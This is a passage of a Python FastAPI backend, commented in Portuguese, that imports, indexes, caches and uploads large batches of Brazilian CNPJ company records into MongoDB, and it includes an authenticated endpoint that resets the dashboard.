# Endpoints de Gestão de CNPJs (para 3M+ registros)
@api_router.post("/cnpjs/importar")
async def importar_cnpjs(cnpjs: List[Dict[str, str]]):
    """Importa CNPJs em massa para o banco de dados
    
    Body exemplo:
    [
        {"cnpj": "12345678000190", "nome": "Empresa 1", "situacao": "ATIVA"},
        {"cnpj": "98765432000111", "nome": "Empresa 2", "situacao": "ATIVA"},
        ...
    ]
    
    Para importar 3M de registros, envie em batches de 1000-10000 por vez
    """
    try:
        documentos = []
        for item in cnpjs:
            cnpj_limpo = item['cnpj'].replace('.', '').replace('/', '').replace('-', '')
            doc = {
                'cnpj': cnpj_limpo,
                'cnpj_formatado': item['cnpj'],
                'nome': item['nome'],
                'situacao': item.get('situacao', 'ATIVA'),
                'fonte': 'importacao_manual',
                'created_at': datetime.now(timezone.utc).isoformat()
            }
            documentos.append(doc)
        
        # Inserção em massa (muito mais rápido)
        result = await db.cnpjs_database.insert_many(documentos, ordered=False)
        
        logger.info(f"Importados {len(result.inserted_ids)} CNPJs")
        
        return {
            "success": True,
            "total_importados": len(result.inserted_ids),
            "message": f"{len(result.inserted_ids)} CNPJs importados com sucesso"
        }
    except Exception as e:
        logger.error(f"Erro na importação: {e}")
        raise HTTPException(status_code=500, detail=f"Erro ao importar CNPJs: {str(e)}")

@api_router.post("/cnpjs/criar-indices")
async def criar_indices():
    """Cria índices no MongoDB para otimizar buscas em 3M+ registros
    
    Índice no campo 'cnpj' permite busca em O(log n) = ~1-5ms
    """
    try:
        # Criar índice único no campo cnpj
        await db.cnpjs_database.create_index("cnpj", unique=True)
        
        # Índice para situacao (para filtros)
        await db.cnpjs_database.create_index("situacao")
        
        logger.info("Índices criados com sucesso")
        
        return {
            "success": True,
            "message": "Índices criados - banco otimizado para 3M+ registros"
        }
    except Exception as e:
        logger.error(f"Erro ao criar índices: {e}")
        raise HTTPException(status_code=500, detail=str(e))

@api_router.get("/cnpjs/stats")
async def cnpjs_stats():
    """Estatísticas da base de CNPJs - Estratégia Híbrida"""
    try:
        # Subset local (CNPJs prioritários importados)
        total_subset = await db.cnpjs_subset.count_documents({})
        
        # Cache (CNPJs consultados e salvos automaticamente)
        total_cache = await db.cnpjs_cache.count_documents({})
        
        # Cache hits
        cache_stats = await db.cnpjs_cache.aggregate([
            {"$group": {
                "_id": None,
                "total_hits": {"$sum": "$hit_count"},
                "avg_hits": {"$avg": "$hit_count"}
            }}
        ]).to_list(1)
        
        total_hits = cache_stats[0]['total_hits'] if cache_stats else 0
        
        # Por fonte
        cache_por_fonte = await db.cnpjs_cache.aggregate([
            {"$group": {"_id": "$fonte", "count": {"$sum": 1}}}
        ]).to_list(10)
        
        return {
            "subset_local": total_subset,
            "cache_automatico": total_cache,
            "total_disponivel_rapido": total_subset + total_cache,
            "cache_hits_total": total_hits,
            "por_fonte": cache_por_fonte,
            "estrategia": "Híbrida: Subset + Cache + API Externa",
            "info": {
                "subset": f"{total_subset:,} CNPJs prioritários (1-5ms)",
                "cache": f"{total_cache:,} CNPJs em cache (1-5ms)",  
                "api_externa": "Backup para CNPJs novos (500ms-2s)",
                "crescimento": "Cache cresce automaticamente com uso"
            }
        }
    except Exception as e:
        logger.error(f"Erro ao buscar stats CNPJs: {e}")
        return {
            "subset_local": 0,
            "cache_automatico": 0,
            "total_disponivel_rapido": 0
        }


# Status de importação global
importacao_status = {
    "em_andamento": False,
    "total_processados": 0,
    "total_importados": 0,
    "total_erros": 0,
    "progresso": 0,
    "mensagem": ""
}


async def processar_importacao_background(conteudo: str, tipo: str):
    """Processa importação em background"""
    global importacao_status
    
    importacao_status["em_andamento"] = True
    importacao_status["total_processados"] = 0
    importacao_status["total_importados"] = 0
    importacao_status["total_erros"] = 0
    importacao_status["progresso"] = 0
    importacao_status["mensagem"] = "Iniciando importação..."
    
    try:
        if tipo == "csv":
            reader = csv.DictReader(io.StringIO(conteudo))
            rows = list(reader)
        else:  # json
            rows = json.loads(conteudo)
        
        total_linhas = len(rows)
        importacao_status["mensagem"] = f"Processando {total_linhas:,} registros..."
        
        BATCH_SIZE = 10000
        batch = []
        
        for idx, row in enumerate(rows):
            try:
                cnpj_limpo = str(row.get('cnpj', '')).replace('.', '').replace('/', '').replace('-', '')
                
                if not cnpj_limpo or len(cnpj_limpo) < 11:
                    importacao_status["total_erros"] += 1
                    continue
                
                doc = {
                    'cnpj': cnpj_limpo,
                    'cnpj_raw': cnpj_limpo,
                    'cnpj_formatado': row.get('cnpj', cnpj_limpo),
                    'razao_social': row.get('nome', row.get('razao_social', f'EMPRESA {cnpj_limpo[-4:]}')),
                    'situacao_cadastral': '02' if row.get('situacao', 'ATIVA') == 'ATIVA' else '03',
                    'situacao': row.get('situacao', row.get('situacao_cadastral', 'ATIVA')),
                    'fonte': 'importacao_subset',
                    'created_at': datetime.now(timezone.utc).isoformat()
                }
                batch.append(doc)
                
                # Inserir batch quando atingir limite
                if len(batch) >= BATCH_SIZE:
                    try:
                        await db.cnpjs_subset.insert_many(batch, ordered=False)
                        importacao_status["total_importados"] += len(batch)
                    except Exception as e:
                        logger.error(f"Erro no batch: {e}")
                        importacao_status["total_erros"] += len(batch)
                    
                    batch = []
                    importacao_status["total_processados"] = idx + 1
                    importacao_status["progresso"] = int((idx + 1) / total_linhas * 100)
                    importacao_status["mensagem"] = f"Processando... {idx+1:,}/{total_linhas:,} ({importacao_status['progresso']}%)"
                
            except Exception as e:
                logger.error(f"Erro na linha {idx}: {e}")
                importacao_status["total_erros"] += 1
        
        # Inserir último batch
        if batch:
            try:
                await db.cnpjs_subset.insert_many(batch, ordered=False)
                importacao_status["total_importados"] += len(batch)
            except Exception:
                importacao_status["total_erros"] += len(batch)
        
        importacao_status["total_processados"] = total_linhas
        importacao_status["progresso"] = 100
        importacao_status["mensagem"] = f"Concluído! {importacao_status['total_importados']:,} CNPJs importados"
        
    except Exception as e:
        logger.error(f"Erro na importação: {e}")
        importacao_status["mensagem"] = f"Erro: {str(e)}"
    finally:
        importacao_status["em_andamento"] = False


@api_router.post("/cnpjs/upload")
async def upload_cnpjs(
    background_tasks: BackgroundTasks,
    file: UploadFile = File(...)
):
    """Upload de arquivo CSV ou JSON com CNPJs
    
    Aceita arquivos até 500MB
    Suporta CSV e JSON
    Processamento em background para não bloquear
    """
    try:
        # Validar tipo de arquivo
        if not file.filename.endswith(('.csv', '.json')):
            raise HTTPException(
                status_code=400, 
                detail="Apenas arquivos CSV ou JSON são aceitos"
            )
        
        # Ler conteúdo do arquivo
        conteudo = await file.read()
        conteudo_str = conteudo.decode('utf-8')
        
        # Verificar tamanho
        tamanho_mb = len(conteudo) / (1024 * 1024)
        logger.info(f"Arquivo recebido: {file.filename} ({tamanho_mb:.2f} MB)")
        
        if tamanho_mb > 500:
            raise HTTPException(
                status_code=400,
                detail=f"Arquivo muito grande: {tamanho_mb:.2f} MB. Máximo: 500 MB"
            )
        
        # Determinar tipo
        tipo = 'csv' if file.filename.endswith('.csv') else 'json'
        
        # Processar em background
        background_tasks.add_task(processar_importacao_background, conteudo_str, tipo)
        
        return {
            "success": True,
            "message": f"Upload recebido: {file.filename} ({tamanho_mb:.2f} MB)",
            "tipo": tipo,
            "status": "Importação iniciada em background"
        }
        
    except HTTPException:
        raise
    except Exception as e:
        logger.error(f"Erro no upload: {e}")
        raise HTTPException(status_code=500, detail=str(e))


@api_router.get("/cnpjs/importacao/status")
async def status_importacao():
    """Retorna status da importação em andamento"""
    return importacao_status


@api_router.post("/dashboard/reset")
async def reset_dashboard(current_user: str = Depends(get_current_user)):
    """Reseta todas as estatísticas e transações do dashboard
    
    CUIDADO: Esta ação é irreversível!
    Remove:
    - Todas as transações
    - Cache de CNPJs
    - (Mantém: Subset de CNPJs prioritários)
    """
    try:
        # Deletar todas as transações
        result_trans = await db.transactions.delete_many({})
        
        # Deletar cache de CNPJs (mas manter subset)
        result_cache = await db.cnpjs_cache.delete_many({})
        
        logger.warning(f"[RESET] Dashboard resetado por {current_user}")
        logger.warning(f"  - {result_trans.deleted_count} transações removidas")
        logger.warning(f"  - {result_cache.deleted_count} CNPJs em cache removidos")
        
        return {
            "success": True,
            "transacoes_removidas": result_trans.deleted_count,
            "cache_removido": result_cache.deleted_count,
            "message": "Dashboard resetado com sucesso",
            "subset_mantido": True
        }
    except Exception as e:
        logger.error(f"Erro ao resetar dashboard: {e}")
        raise HTTPException(status_code=500, detail=str(e))


# Include router
app.include_router(api_router)

# CORS
app.add_middleware(
    CORSMiddleware,
    allow_credentials=True,
    allow_origins=os.environ.get('CORS_ORIGINS', '*').split(','),
    allow_methods=["*"],
    allow_headers=["*"],
)

@app.on_event("shutdown")
async def shutdown_db_client():
    client.close()

if __name__ == "__main__":
    import uvicorn
    uvicorn.run(app, host="0.0.0.0", port=8001)
